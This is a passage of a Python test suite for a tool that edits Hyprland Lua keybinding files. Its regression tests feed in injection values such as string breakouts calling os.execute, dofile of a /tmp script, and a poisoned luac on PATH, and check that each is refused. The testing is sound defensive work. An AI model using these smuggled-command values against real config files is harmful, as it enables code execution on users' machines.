            for chord in ("", "-notakey", "   "):
                res = keybinds_manager.set_keybinding(chord, "d", "true")
                self.assertFalse(res["success"], (chord, res))
            # A lone modifier is not a keysym: it binds nothing, so it is refused
            # now instead of being reported as saved.
            self.assertFalse(keybinds_manager._key_is_plausible("SUPER"))
            self.assertTrue(keybinds_manager._key_is_plausible("switch:on:Apple SMC power/lid events"))
            self.assertTrue(keybinds_manager._key_is_plausible("ALT + Alt_R"))
            self.assertEqual(self._read(), "")
        finally:
            self._unstub_set_keybinding()

    def test_a_nested_binding_in_a_table_is_refused(self):
        self._stub_set_keybinding()
        try:
            self._write("")
            res = keybinds_manager.set_keybinding(
                "SUPER + Y", "d", "", '{ o.bind("SUPER + Z", "z", "c") }')
            self.assertFalse(res["success"])
            self.assertIn("may not register another binding", res["error"])
        finally:
            self._unstub_set_keybinding()

    def test_a_rejected_file_is_not_reported_as_applied(self):
        self._stub_set_keybinding()
        try:
            keybinds_manager.reload_hyprland = lambda: {
                "success": False, "reload_output": "", "config_errors": "bindings.lua:3 unexpected symbol"}
            self._write("")
            res = keybinds_manager.set_keybinding("SUPER + J", "j", "j")
            self.assertFalse(res["reload_success"])
            self.assertIn("unexpected symbol", res["reload_errors"])
        finally:
            self._unstub_set_keybinding()
            keybinds_manager.reload_hyprland = lambda: {
                "success": True, "reload_output": "", "config_errors": ""}

    # -- round-6 review: injection via old_action, spellings, defaults, opts -----

    def test_old_action_is_never_written_as_lua(self):
        self._stub_set_keybinding()
        try:
            marker = os.path.join(tempfile.mkdtemp(), "pwned")
            self._write('o.bind("SUPER + W", "Close", "x")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + W", "Close", "x", "", "SUPER + W", old_description="Close",
                old_command="x",
                old_action='"x") os.execute("touch ' + marker + '") --')
            self.assertFalse(res["success"], res)
            self.assertFalse(os.path.exists(marker))
            self.assertEqual(keybinds_manager._lua_compile_error(self._read()), "")
        finally:
            self._unstub_set_keybinding()

    def test_a_spaced_or_bracketed_bind_head_can_be_disabled(self):
        self._stub_set_keybinding()
        try:
            for spelling in ('o .bind([[SUPER + W]], "mine", "evil")',
                             'o["bind"]("SUPER + W", "mine", "evil")',
                             "o['bind']('SUPER + W', 'mine', 'evil')"):
                self._write(spelling + "\n")
                res = keybinds_manager.disable_keybinding("SUPER + W")
                self.assertTrue(res["success"], (spelling, res))
                live = [l for l in self._read().splitlines()
                        if "SUPER + W" in l and not l.strip().startswith("hl.unbind")]
                self.assertFalse(live, (spelling, self._read()))
        finally:
            self._unstub_set_keybinding()

    def test_a_shipped_default_row_can_be_edited_in_place(self):
        # The plugin's main operation: override a default at its own chord. The
        # duplicate proof used to read 0 -> 1 as a duplication and refuse.
        self._stub_set_keybinding()
        try:
            keybinds_manager.parse_default_bindings = lambda: [
                {"key": "SUPER + RETURN", "description": "Terminal",
                 "command": "", "action": "o.launch_terminal()", "opts": "", "fn": "o.bind"}]
            self._write("")
            res = keybinds_manager.set_keybinding(
                "SUPER + RETURN", "Terminal edited", "", "o.launch_terminal()",
                "SUPER + RETURN", old_description="Terminal", old_command="",
                old_action="o.launch_terminal()")
            self.assertTrue(res["success"], res)
            self.assertEqual(self._read().count("o.bind("), 1)
        finally:
            self._unstub_set_keybinding()

    def test_call_form_and_options_table_are_preserved(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind_toggle("SUPER + T", "Touchpad", "touchpad")\n'
                        'o.bind("SUPER + K", "Vol", "vol-up", '
                        '{ locked = true, repeating = true })\n')
            r1 = keybinds_manager.set_keybinding(
                "SUPER + T", "Touchpad2", "touchpad", "", "SUPER + T",
                old_description="Touchpad", old_command="touchpad")
            r2 = keybinds_manager.set_keybinding(
                "SUPER + K", "Vol up", "vol-up", "", "SUPER + K",
                old_description="Vol", old_command="vol-up")
            content = self._read()
            self.assertTrue(r1["success"], r1)
            self.assertTrue(r2["success"], r2)
            self.assertIn("o.bind_toggle(", content)
            self.assertIn("repeating = true", content)
        finally:
            self._unstub_set_keybinding()

    def test_invalid_lua_is_refused_before_it_is_committed(self):
        if not (shutil.which("luac") or shutil.which("luac5.4")):
            self.skipTest("no Lua compiler installed")
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + W", "Close", "x")\n')
            before = self._read()
            res = keybinds_manager.set_keybinding(
                "SUPER + Y", "d", "", "hl.dsp.notify(1 2)")
            self.assertFalse(res["success"], res)
            self.assertIn("compile", res["error"])
            self.assertEqual(self._read(), before)
        finally:
            self._unstub_set_keybinding()

    def test_a_quote_leading_description_is_replaced_not_duplicated(self):
        self._stub_set_keybinding()
        try:
            self._write('o.bind("SUPER + W", "\\"vim\\" scratch", "gvim")\n')
            res = keybinds_manager.set_keybinding(
                "SUPER + W", '"vim" scratch 2', "gvim", "", "SUPER + W",
                old_description='"vim" scratch', old_command="gvim")
            self.assertTrue(res["success"], res)
            self.assertEqual(self._read().count("o.bind("), 1)
        finally:
            self._unstub_set_keybinding()

    def test_menu_reader_refuses_a_fifo(self):
        fifo = os.path.join(self._tmpdir.name, "omarchy-menu.jsonc")
        os.mkfifo(fifo)
        saved = keybinds_manager.MENU_CONFIG_PATH
        keybinds_manager.MENU_CONFIG_PATH = fifo
        try:
            res = keybinds_manager.check_menu_entry()
            self.assertFalse(res["success"])
            res = keybinds_manager.install_menu_entry()
            self.assertFalse(res["success"])
        finally:
            keybinds_manager.MENU_CONFIG_PATH = saved




class TestRoundNineRegressions(unittest.TestCase):
    """Ninth reviewer round: function dispatchers, keysyms and mouse rows."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.home = self._tmp.name
        self._saved = {
            "HOME": os.environ.get("HOME"),
            "UBP": keybinds_manager.USER_BINDINGS_PATH,
            "run": keybinds_manager.subprocess.run,
        }
        os.environ["HOME"] = self.home
        os.makedirs(os.path.join(self.home, ".config", "hypr"), exist_ok=True)
        self.path = os.path.join(self.home, ".config", "hypr", "bindings.lua")
        keybinds_manager.USER_BINDINGS_PATH = self.path
        keybinds_manager.subprocess.run = lambda *a, **k: types.SimpleNamespace(
            returncode=0, stdout="", stderr="")

    def tearDown(self):
        keybinds_manager.USER_BINDINGS_PATH = self._saved["UBP"]
        keybinds_manager.subprocess.run = self._saved["run"]
        if self._saved["HOME"] is None:
            os.environ.pop("HOME", None)
        else:
            os.environ["HOME"] = self._saved["HOME"]
        self._tmp.cleanup()

    def _file(self):
        try:
            with open(self.path, encoding="utf-8") as f:
                return f.read()
        except FileNotFoundError:
            return ""

    def test_a_function_that_closes_its_call_early_is_refused(self):
        problem = keybinds_manager._lua_single_expression_problem(
            'function() end) os.execute("touch pwned") -- end')
        self.assertTrue(problem)

    def test_a_well_shaped_function_is_accepted(self):
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            "function() hl.dsp.exec(\"kitty\") end"), "")
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            "function() if x then return 1 end end"), "")

    def test_a_function_branch_keeps_the_control_byte_and_length_rules(self):
        self.assertIn("control", keybinds_manager._lua_single_expression_problem(
            'function() return "\x1b]0;pwn\x07" end'))
        long_expr = "function() hl.dsp.exec(\"" + "a" * 2100 + "\") end"
        self.assertIn("2000", keybinds_manager._lua_single_expression_problem(long_expr))

    def test_a_side_keysym_survives_normalisation(self):
        # Omarchy ships push-to-talk as o.bind_hold("ALT + Alt_R", ...). Folding
        # Alt_R into the ALT modifier made the chord keysym-less, so an edit
        # rewrote the shortcut and 'disable' reported a live key as off.
        for raw in ("ALT + Alt_R", "SUPER + SUPER_L", "CTRL + CONTROL_R"):
            norm = keybinds_manager.normalize_key_chord(raw)
            self.assertTrue(keybinds_manager._key_is_plausible(norm), norm)
            self.assertTrue(norm.split(" + ")[-1] != norm.split(" + ")[0]
                            or len(norm.split(" + ")) > 1, norm)

    def test_a_hold_tail_with_a_call_is_refused(self):
        line = ('o.bind_hold("SUPER + F6", "d", "cmd", "stop d", os.execute("id"), '
                '{ locked = true })')
        with open(self.path, "w", encoding="utf-8") as f:
            f.write(line + "\n")
        entry = keybinds_manager.parse_user_bindings()["binds"][0]
        res = keybinds_manager.set_keybinding(
            entry["key"], "d", "", entry["action"], entry["raw_key"],
            old_description=entry["description"], old_action=entry["action"])
        self.assertFalse(res["success"])

    def test_a_relative_omarchy_path_is_ignored(self):
        saved = os.environ.get("OMARCHY_PATH")
        try:
            os.environ["OMARCHY_PATH"] = "evil/relative"
            self.assertEqual(keybinds_manager._omarchy_root(), "/usr/share/omarchy")
            os.environ["OMARCHY_PATH"] = "/nonexistent/omarchy"
            self.assertEqual(keybinds_manager._omarchy_root(), "/usr/share/omarchy")
        finally:
            if saved is None:
                os.environ.pop("OMARCHY_PATH", None)
            else:
                os.environ["OMARCHY_PATH"] = saved

    def test_a_semicolon_in_a_chord_is_refused(self):
        self.assertFalse(keybinds_manager._key_is_plausible("SUPER + A;B"))

    def test_a_save_leaves_the_file_owner_only(self):
        # Owner-only, not "keep whatever mode was there": a bind command can carry a
        # secret, and the same save writes its .bak and compile temp at 0600.
        with open(self.path, "w", encoding="utf-8") as f:
            f.write('o.bind("SUPER + Q", "Q", "true")\n')
        os.chmod(self.path, 0o646)
        res = keybinds_manager.set_keybinding("SUPER + Q", "Q2", "true")
        self.assertTrue(res["success"], res)
        self.assertEqual(os.stat(self.path).st_mode & 0o777, 0o600)

    def test_a_mouse_binding_saved_shows_as_modified_not_disabled(self):
        defaults = [b for b in keybinds_manager.parse_default_bindings() if b["is_mouse"]]
        if not defaults:
            self.skipTest("no shipped mouse bindings on this machine")
        d = defaults[0]
        res = keybinds_manager.set_keybinding(
            d["key"], "Drag window (mine)", "", d["action"], d["raw_key"],
            old_description=d["description"], old_action=d["action"])
        self.assertTrue(res["success"], res)
        model = keybinds_manager.build_complete_model()
        active = model["active"] if isinstance(model, dict) else model
        rows = [r for r in active if r["key"] == d["key"]]
        self.assertTrue(rows)
        self.assertNotIn("disabled", [r["status"] for r in rows])


class TestRoundTenRegressions(unittest.TestCase):
    """Tenth reviewer round: unbind ordering, disable/enable fidelity, row identity."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.home = self._tmp.name
        self._saved = {"HOME": os.environ.get("HOME"),
                       "UBP": keybinds_manager.USER_BINDINGS_PATH,
                       "run": keybinds_manager.subprocess.run}
        os.environ["HOME"] = self.home
        os.makedirs(os.path.join(self.home, ".config", "hypr"), exist_ok=True)
        self.path = os.path.join(self.home, ".config", "hypr", "bindings.lua")
        keybinds_manager.USER_BINDINGS_PATH = self.path
        keybinds_manager.subprocess.run = lambda *a, **k: types.SimpleNamespace(
            returncode=0, stdout="", stderr="")

    def tearDown(self):
        keybinds_manager.USER_BINDINGS_PATH = self._saved["UBP"]
        keybinds_manager.subprocess.run = self._saved["run"]
        if self._saved["HOME"] is None:
            os.environ.pop("HOME", None)
        else:
            os.environ["HOME"] = self._saved["HOME"]
        self._tmp.cleanup()

    def _write(self, text):
        with open(self.path, "w", encoding="utf-8") as f:
            f.write(text)

    def _read(self):
        with open(self.path, encoding="utf-8") as f:
            return f.read()

    def test_the_unbind_never_lands_after_the_row_it_shadows(self):
        # The edited row was the file's last statement and only a comment followed:
        # insert_at ended up below it, so the unbind killed the binding just saved.
        self._write('-- my overrides\n'
                    'o.bind("SUPER + W", "Close", "hyprctl dispatch killactive")\n'
                    '-- TODO: tidy this file')
        res = keybinds_manager.set_keybinding(
            "SUPER + W", "Close window", "hyprctl dispatch killactive", "",
            "SUPER + W", old_description="Close",
            old_command="hyprctl dispatch killactive", old_action="")
        self.assertTrue(res["success"], res)
        lines = [l for l in self._read().splitlines() if l.strip()]
        unbind_at = next(i for i, l in enumerate(lines) if "hl.unbind" in l)
        bind_at = next(i for i, l in enumerate(lines) if "o.bind" in l)
        self.assertLess(unbind_at, bind_at, lines)

    def test_disable_then_enable_keeps_the_users_own_command(self):
        self._write('o.bind("SUPER + mouse:272", "Move window", "my-drag-command")\n')
        res = keybinds_manager.disable_keybinding(
            "SUPER + mouse:272", "Move window", "my-drag-command")
        self.assertTrue(res["success"], res)
        self.assertIn("my-drag-command", self._read())
        self.assertIn("hl.unbind", self._read())
        res = keybinds_manager.enable_keybinding("SUPER + mouse:272")
        self.assertTrue(res["success"], res)
        content = self._read()
        self.assertIn("my-drag-command", content)
        self.assertNotIn("hl.unbind", content)

    def test_deleting_a_row_leaves_its_sibling_on_the_chord(self):
        self._write('o.bind("SUPER + Y","First custom","alpha")\n'
                    'o.bind("SUPER + Y","Second custom","beta")\n')
        res = keybinds_manager.reset_keybinding(
            "SUPER + Y", "", description="First custom", action="alpha")
        self.assertTrue(res["success"], res)
        content = self._read()
        self.assertIn("Second custom", content)
        self.assertNotIn("First custom", content)

    def test_a_function_cannot_be_followed_by_another_expression(self):
        for expr in ('function() end, os.execute("id"), function() end',
                     'function() end, hl.unbind("SUPER + Q"), function() end',
                     'function() end do os.execute("id") end'):
            with self.subTest(expr=expr):
                self.assertTrue(
                    keybinds_manager._lua_single_expression_problem(expr), expr)
        self.assertEqual(
            keybinds_manager._lua_single_expression_problem("function(a, b) return a + b end"), "")

    def test_the_chord_keeps_the_spelling_it_was_written_with(self):
        defaults = [b for b in keybinds_manager.parse_default_bindings()
                    if b["raw_key"] == "ALT + Alt_R"]
        if not defaults:
            self.skipTest("no dictation row on this machine")
        d = defaults[0]
        res = keybinds_manager.set_keybinding(
            d["key"], "Dictate", d["command"], d["action"], d["raw_key"],
            old_description=d["description"], old_command=d["command"],
            old_action=d["action"])
        self.assertTrue(res["success"], res)
        self.assertIn('"ALT + Alt_R"', self._read())

    def test_a_rewrite_clears_group_write_permission(self):
        self._write('o.bind("SUPER + Q", "Q", "true")\n')
        os.chmod(self.path, 0o666)
        res = keybinds_manager.set_keybinding("SUPER + Q", "Q2", "true")
        self.assertTrue(res["success"], res)
        mode = os.stat(self.path).st_mode & 0o777
        self.assertFalse(mode & 0o022, oct(mode))


class TestRoundElevenRegressions(unittest.TestCase):
    """Eleventh reviewer round: moved-override reset, disable visibility, identity."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.home = self._tmp.name
        self._saved = {"HOME": os.environ.get("HOME"),
                       "UBP": keybinds_manager.USER_BINDINGS_PATH,
                       "run": keybinds_manager.subprocess.run}
        os.environ["HOME"] = self.home
        os.makedirs(os.path.join(self.home, ".config", "hypr"), exist_ok=True)
        self.path = os.path.join(self.home, ".config", "hypr", "bindings.lua")
        keybinds_manager.USER_BINDINGS_PATH = self.path
        keybinds_manager.subprocess.run = lambda *a, **k: types.SimpleNamespace(
            returncode=0, stdout="", stderr="")

    def tearDown(self):
        keybinds_manager.USER_BINDINGS_PATH = self._saved["UBP"]
        keybinds_manager.subprocess.run = self._saved["run"]
        if self._saved["HOME"] is None:
            os.environ.pop("HOME", None)
        else:
            os.environ["HOME"] = self._saved["HOME"]
        self._tmp.cleanup()

    def _read(self):
        with open(self.path, encoding="utf-8") as f:
            return f.read()

    def _rows(self):
        model = keybinds_manager.build_complete_model()
        return model["active"] if isinstance(model, dict) else model

    def test_reset_of_a_moved_override_frees_the_default_chord(self):
        defaults = [b for b in keybinds_manager.parse_default_bindings()
                    if b["action"] and b["key"]]
        d = defaults[0]
        with open(self.path, "w", encoding="utf-8") as f:
            f.write("")
        res = keybinds_manager.set_keybinding(
            "SUPER + ALT + F9", d["description"], d["command"], d["action"], d["key"],
            old_description=d["description"], old_command=d["command"],
            old_action=d["action"])
        self.assertTrue(res["success"], res)
        self.assertIn("hl.unbind", self._read())
        res = keybinds_manager.reset_keybinding(
            "SUPER + ALT + F9", d["key"], d["description"], d["action"])
        self.assertTrue(res["success"], res)
        self.assertNotIn("hl.unbind", self._read())
        rows = [r for r in self._rows() if r["key"] == d["key"]]
        self.assertEqual([r["status"] for r in rows], ["default"])

    def test_a_disabled_user_row_is_reported_disabled(self):
        with open(self.path, "w", encoding="utf-8") as f:
            f.write('o.bind("SUPER + W", "Close window (mine)", "killactive")\n')
        res = keybinds_manager.disable_keybinding(
            "SUPER + W", "Close window (mine)", "killactive")
        self.assertTrue(res["success"], res)
        rows = [r for r in self._rows() if r["key"] == "SUPER + W"]
        # The user's row AND the shipped default it shadows are both dead now.
        self.assertTrue(rows)
        self.assertEqual({r["status"] for r in rows}, {"disabled"})
        res = keybinds_manager.enable_keybinding("SUPER + W")
        self.assertTrue(res["success"], res)
        rows = [r for r in self._rows() if r["key"] == "SUPER + W"]
        # The user's binding is live again; the shipped default stays hidden by the
        # shadow unbind (that is the point of keeping it).
        self.assertIn("custom", [r["status"] for r in rows])
        self.assertTrue(any(r["status"] == "disabled" and r["default_key"] == "SUPER + W"
                            for r in rows))
        self.assertIn("killactive", self._read())

    def test_a_user_bind_on_a_two_default_chord_is_listed_once(self):
        with open(self.path, "w", encoding="utf-8") as f:
            f.write('o.bind("ALT + TAB", "Focus on next window", hl.dsp.window.cycle_next())\n')
        rows = [r for r in self._rows() if r["key"] == "ALT + TAB"]
        self.assertEqual(len(rows), 2, [(r["status"], r["description"]) for r in rows])
        self.assertEqual(len({r["description"] for r in rows}), 2)

    def test_a_function_cannot_carry_a_masked_literal_after_its_end(self):
        for expr in ('function() end "x"', 'function() end[[x]]', 'function() end)'):
            with self.subTest(expr=expr):
                self.assertTrue(keybinds_manager._lua_single_expression_problem(expr), expr)
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            "function() if a then x() elseif b then y() end end"), "")
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            "function() repeat x() until y end"), "")

    def test_a_lone_modifier_is_refused(self):
        self.assertFalse(keybinds_manager._key_is_plausible("SUPER"))

    def test_a_hold_table_carrying_a_call_is_refused(self):
        self.assertFalse(keybinds_manager._hold_tail_is_shaped(
            '"stop it", "false", { locked = true, os.execute("id") }'))
        self.assertTrue(keybinds_manager._hold_tail_is_shaped(
            '"Stop dictation (push-to-talk)", "omarchy-dictation stop", { ignore_mods = true }'))


class TestRoundTwelveRegressions(unittest.TestCase):
    """Twelfth reviewer round: Disable on an override, reset scope, siblings."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.home = self._tmp.name
        self._saved = {"HOME": os.environ.get("HOME"),
                       "UBP": keybinds_manager.USER_BINDINGS_PATH,
                       "run": keybinds_manager.subprocess.run}
        os.environ["HOME"] = self.home
        os.makedirs(os.path.join(self.home, ".config", "hypr"), exist_ok=True)
        self.path = os.path.join(self.home, ".config", "hypr", "bindings.lua")
        keybinds_manager.USER_BINDINGS_PATH = self.path
        keybinds_manager.subprocess.run = lambda *a, **k: types.SimpleNamespace(
            returncode=0, stdout="", stderr="")

    def tearDown(self):
        keybinds_manager.USER_BINDINGS_PATH = self._saved["UBP"]
        keybinds_manager.subprocess.run = self._saved["run"]
        if self._saved["HOME"] is None:
            os.environ.pop("HOME", None)
        else:
            os.environ["HOME"] = self._saved["HOME"]
        self._tmp.cleanup()

    def _write(self, text):
        with open(self.path, "w", encoding="utf-8") as f:
            f.write(text)

    def _read(self):
        with open(self.path, encoding="utf-8") as f:
            return f.read()

    def _rows(self, chord):
        model = keybinds_manager.build_complete_model()
        active = model["active"] if isinstance(model, dict) else model
        return [r for r in active if r["key"] == chord]

    def test_disable_really_disables_a_plugin_written_override(self):
        defaults = [b for b in keybinds_manager.parse_default_bindings()
                    if b["action"] and b["command"]]
        d = defaults[0]
        self._write("")
        res = keybinds_manager.set_keybinding(
            d["key"], "Mine", d["command"], d["action"], d["key"],
            old_description=d["description"], old_command=d["command"],
            old_action=d["action"])
        self.assertTrue(res["success"], res)
        self.assertEqual(self._read().count("hl.unbind"), 1)  # the shadow, above
        res = keybinds_manager.disable_keybinding(
            d["key"], "Mine", d["description"])
        self.assertTrue(res["success"], res)
        # A second unbind at the end: the one above the bind removes nothing.
        self.assertEqual(self._read().count("hl.unbind"), 2, self._read())
        self.assertEqual([r["status"] for r in self._rows(d["key"])], ["disabled"])

    def test_deleting_a_custom_row_leaves_an_unrelated_disabled_default_alone(self):
        self._write('hl.unbind("SUPER + W")\n'
                    'o.bind("SUPER + ALT + K", "Close window", "omarchy-launch-browser")\n')
        res = keybinds_manager.reset_keybinding(
            "SUPER + ALT + K", "", description="Close window",
            action='"omarchy-launch-browser"')
        self.assertTrue(res["success"], res)
        self.assertIn('hl.unbind("SUPER + W")', self._read())
        self.assertNotIn("SUPER + ALT + K", self._read())

    def test_a_nil_description_row_can_be_deleted(self):
        self._write('o.bind("SUPER + SHIFT + F10", nil, "notify-send hi")\n')
        row = self._rows("SUPER + SHIFT + F10")[0]
        self.assertEqual(row.get("description_raw"), "")
        res = keybinds_manager.reset_keybinding(
            "SUPER + SHIFT + F10", "", description=row.get("description_raw", ""),
            action=row["action"])
        self.assertTrue(res["success"], res)
        self.assertNotIn("SUPER + SHIFT + F10", self._read())

    def test_a_two_default_chord_keeps_its_other_default_listed(self):
        self._write('hl.unbind("ALT + TAB")\n'
                    'o.bind("ALT + TAB", "Reveal active window on top", '
                    'hl.dsp.window.bring_to_top())\n')
        rows = self._rows("ALT + TAB")
        self.assertEqual(len(rows), 2, [(r["status"], r["description"]) for r in rows])
        mine = [r for r in rows if r["status"] == "modified"][0]
        self.assertIn("bring_to_top", mine["default_action"])
        sibling = [r for r in rows if r["status"] == "disabled"][0]
        self.assertIn("cycle_next", sibling["action"])

    def test_a_then_without_an_if_is_refused(self):
        self.assertTrue(keybinds_manager._lua_single_expression_problem(
            "function() then end end"))
        self.assertEqual(keybinds_manager._lua_single_expression_problem(
            "function() if a then f() elseif b then g() else h() end end"), "")

    def test_a_function_action_needs_a_compiler_to_be_written(self):
        # The shape checks are a token stack, not a parser: without luac a body Lua
        # rejects would land as "saved" and Hyprland would drop the whole file.
        self._write("")
        orig = keybinds_manager._trusted_binary
        keybinds_manager._trusted_binary = lambda name: ""
        try:
            res = keybinds_manager.set_keybinding(
                "SUPER + Y", "y", "", 'function() return 1 os.execute("id") end')
        finally:
            keybinds_manager._trusted_binary = orig
        self.assertFalse(res["success"], res)
        self.assertIn("Lua compiler", res["error"])
        self.assertNotIn("SUPER + Y", self._read())

    def test_a_parenless_call_in_an_options_table_is_refused(self):
        for tail in ('"stop", "stop-cmd", { locked = true, os.execute"id" }',
                     '"stop", "stop-cmd", { locked = true, os.execute [[id]] }'):
            with self.subTest(tail=tail):
                self.assertFalse(keybinds_manager._hold_tail_is_shaped(tail))
        self.assertTrue(keybinds_manager._hold_tail_is_shaped(
            '"Stop dictation (push-to-talk)", "omarchy-dictation stop", { ignore_mods = true }'))

    def test_the_active_count_matches_the_rows_the_tab_shows(self):
        self._write('o.bind("SUPER + Q", "Q", "true")\nhl.unbind("SUPER + W")\n')
        model = keybinds_manager.build_complete_model()
        self.assertEqual(model["total_active"], len(model["active"]))


class TestRoundThirteenRegressions(TestRoundTwelveRegressions):
    """Thirteenth reviewer round: Enable, disabled rows, row identity, luac."""

    def _row_for(self, key):
        keybinds_manager.parse_user_bindings = keybinds_manager.parse_user_bindings
        model = keybinds_manager.build_complete_model()
        return next((b for b in model["active"] if b["key"] == key), None)

    def test_enable_keeps_the_shadow_unbind_that_hides_the_default(self):
        # Disable -> Enable used to delete EVERY unbind, so Omarchy's default came
        # back beside the user's binding and one keypress ran both actions.
        self._write("")
        key = "SUPER + RETURN"  # a shipped default, so the save shadows it
        keybinds_manager.set_keybinding(key, "Terminal Override", "my-term")
        self.assertEqual(self._read().count('hl.unbind("' + key + '")'), 1, self._read())
        keybinds_manager.disable_keybinding(key, "Terminal Override", "my-term")
        self.assertEqual(self._read().count('hl.unbind("' + key + '")'), 2, self._read())
        keybinds_manager.enable_keybinding(key)
        text = self._read()
        self.assertEqual(text.count('hl.unbind("' + key + '")'), 1, text)
        self.assertIn("my-term", text)

    def test_a_disabled_override_keeps_reset_and_offers_no_dead_enable(self):
        self._write("")
        key = "SUPER + SHIFT + B"
        keybinds_manager.set_keybinding(key, "Browser Override", "my-browser")
        keybinds_manager.disable_keybinding(key, "Browser Override", "my-browser")
        row = self._row_for(key)
        self.assertEqual(row["status"], "disabled")
        self.assertTrue(row["disabled_row"])
        # A row on a default chord is restored (Reset); Delete belongs to custom rows.
        self.assertTrue(row["can_reset"])
        self.assertFalse(row["can_delete"])
        # Enable works there (it removes the unbind Disable appended and keeps the
        # shadow), so the model offers it.
        self.assertTrue(row["can_enable"])
        res = keybinds_manager.enable_keybinding(key)
        self.assertTrue(res["success"], res)
        self.assertEqual(self._read().count('hl.unbind("' + key + '")'), 1)

    def test_a_second_bind_on_an_overridden_chord_stays_visible(self):
        self._write('hl.unbind("ALT + TAB")\n'
                    'o.bind("ALT + TAB", "Next", hl.dsp.window.cycle_next())\n'
                    'o.bind("ALT + TAB", "Other thing", "other-cmd")\n')
        model = keybinds_manager.build_complete_model()
        descriptions = [b["description"] for b in model["active"]
                        if b["key"] == "ALT + TAB"]
        self.assertIn("Other thing", descriptions)

    def test_an_existing_function_row_does_not_block_an_unrelated_save(self):
        # The no-luac refusal compared the WHOLE rendered file, so one hand-written
        # function row blocked every later edit and blamed the row being saved.
        self._write('o.bind("SUPER + F6", "Existing", function() return 1 end)\n')
        orig = keybinds_manager._trusted_binary
        keybinds_manager._trusted_binary = lambda name: ""
        try:
            res = keybinds_manager.set_keybinding("SUPER + F7", "Unrelated", "plain-cmd")
        finally:
            keybinds_manager._trusted_binary = orig
        self.assertTrue(res["success"], res)
        self.assertIn("plain-cmd", self._read())

    def test_a_nested_function_action_is_refused_without_a_compiler(self):
        self._write("")
        orig = keybinds_manager._trusted_binary
        keybinds_manager._trusted_binary = lambda name: ""
        try:
            for payload in ('f(function() if x end)',
                            't.x( function() if x end )',
                            '{ run = ( function() if x end ) }'):
                with self.subTest(payload=payload):
                    res = keybinds_manager.set_keybinding("SUPER + F5", "t", "", payload)
                    self.assertFalse(res["success"], res)
        finally:
            keybinds_manager._trusted_binary = orig

    def test_a_bare_name_call_in_an_options_table_is_refused(self):
        for table in ('{ locked = dofile "/tmp/pwn.lua" }',
                      '{ locked = dofile [[/tmp/pwn.lua]] }'):
            with self.subTest(table=table):
                self.assertFalse(keybinds_manager._table_carries_no_code(table))
        self.assertTrue(keybinds_manager._table_carries_no_code("{ locked = true, n = -2 }"))

    def test_a_raw_dispatcher_may_not_start_with_a_long_string(self):
        self.assertTrue(keybinds_manager._lua_single_expression_problem(
            '[[x]] os.execute("id")'))

    def test_editing_a_disabled_row_keeps_it_disabled(self):
        self._write("")
        key = "SUPER + SHIFT + F"
        keybinds_manager.set_keybinding(key, "Files Override", "my-files")
        keybinds_manager.disable_keybinding(key, "Files Override", "my-files")
        res = keybinds_manager.set_keybinding(
            key, "Files Override", "my-files-2",
            old_key=key, old_description="Files Override",
            old_command="my-files", keep_disabled=True)
        self.assertTrue(res["success"], res)
        text = self._read()
        self.assertEqual(text.count('hl.unbind("' + key + '")'), 2, text)
        self.assertIn(key, keybinds_manager._chords_disabled_by_unbind())


class TestRoundFifteenEnableAndBinaries(TestRoundTwelveRegressions):
    """Fifteenth round: Enable must work on the shapes users actually have."""

    def test_enable_works_on_a_hand_written_unbind(self):
        self._write('-- my overrides\nhl.unbind("SUPER + W")\n'
                    'o.bind("SUPER + F9", "Mine", "cmd")\n')
        res = keybinds_manager.enable_keybinding("SUPER + W")
        self.assertTrue(res["success"], res)
        self.assertNotIn('hl.unbind("SUPER + W")', self._read())

    def test_enable_survives_a_later_save(self):
        # "trailing" must mean "after the last bind ON THIS CHORD": comparing with
        # the last bind in the file made the button dead after any other save.
        self._write("")
        keybinds_manager.set_keybinding("SUPER + RETURN", "Term Override", "my-term")
        keybinds_manager.disable_keybinding("SUPER + RETURN", "Term Override", "my-term")
        keybinds_manager.set_keybinding("SUPER + F8", "Other", "other-cmd")
        res = keybinds_manager.enable_keybinding("SUPER + RETURN")
        self.assertTrue(res["success"], res)
        text = self._read()
        self.assertEqual(text.count('hl.unbind("SUPER + RETURN")'), 1, text)  # shadow stays
        self.assertIn("my-term", text)

    def test_one_function_row_does_not_whitelist_a_broken_second(self):
        self._write("-- don't remove this header\n"
                    'o.bind("SUPER + F6", "Existing", function() return 1 end)\n')
        orig = keybinds_manager._trusted_binary
        keybinds_manager._trusted_binary = lambda name: ""
        try:
            for payload in ("function() if x end", "f(function() if x end)"):
                with self.subTest(payload=payload):
                    res = keybinds_manager.set_keybinding("SUPER + F7", "New", "", payload)
                    self.assertFalse(res["success"], res)
        finally:
            keybinds_manager._trusted_binary = orig

    def test_a_comment_with_an_apostrophe_does_not_hide_the_gate(self):
        self._write("-- don't remove this header\n")
        orig = keybinds_manager._trusted_binary
        keybinds_manager._trusted_binary = lambda name: ""
        try:
            res = keybinds_manager.set_keybinding("SUPER + F7", "New", "", "function() if x end")
        finally:
            keybinds_manager._trusted_binary = orig
        self.assertFalse(res["success"], res)

    def test_a_world_writable_binary_is_not_trusted(self):
        import stat as _stat
        tmp = tempfile.mkdtemp(dir=self.home)
        fake = os.path.join(tmp, "luac")
        with open(fake, "w") as f:
            f.write("#!/bin/sh\n")
        os.chmod(fake, 0o777)
        saved_path = os.environ.get("PATH", "")
        os.environ["PATH"] = tmp + ":" + saved_path
        try:
            resolved = keybinds_manager._trusted_binary("luac")
            # The poisoned entry is skipped, and the resolver falls through to a
            # trusted luac further down PATH instead of giving up (which used to
            # silently disable the compile gate).
            self.assertNotEqual(resolved, fake)
            self.assertFalse(resolved.startswith(tmp))
        finally:
            os.environ["PATH"] = saved_path

    def test_a_default_on_a_two_default_chord_pairs_by_name(self):
        self._write('hl.unbind("ALT + TAB")\n'
                    'o.bind("ALT + TAB", "Reveal active window on top", '
                    '"hyprctl dispatch bringactivetotop")\n')
        model = keybinds_manager.build_complete_model()
        rows = [b for b in model["active"] if b["key"] == "ALT + TAB"]
